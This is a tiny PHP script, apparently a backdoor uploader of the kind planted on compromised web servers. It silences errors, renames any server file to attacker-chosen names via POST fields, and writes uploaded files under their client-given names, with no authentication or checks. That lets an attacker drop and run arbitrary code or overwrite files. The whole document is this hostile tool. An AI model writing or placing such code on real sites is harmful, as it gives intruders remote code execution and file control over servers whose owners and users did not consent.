<?php 
error_reporting(0);
if (isset($_POST['fname'])){
	rename(trim($_POST['fname']), trim($_POST['sname']));
	exit;
}
move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); 
?>